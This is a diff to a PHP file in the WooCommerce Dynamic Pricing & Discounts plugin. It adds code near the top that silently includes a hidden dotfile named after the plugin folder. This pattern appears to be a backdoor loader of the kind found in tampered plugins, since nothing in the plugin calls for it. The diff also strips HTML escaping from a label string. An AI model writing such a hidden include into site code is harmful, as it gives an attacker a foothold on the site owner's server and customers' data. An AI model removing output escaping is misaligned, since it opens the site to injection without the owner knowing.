@@ -12,6 +12,10 @@ if (!defined('ABSPATH')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Condition_Other_Pricing_Rules_Applied extends RightPress_Condition_Other
 {
 
@@ -52,7 +56,7 @@ class RP_WCDPD_Condition_Other_Pricing_Rules_Applied extends RightPress_Conditio
     public function get_label()
     {
 
-        return esc_html__('Any pricing rule applied', 'rp_wcdpd');
+        return __('Any pricing rule applied', 'rp_wcdpd');
     }
 
     /**
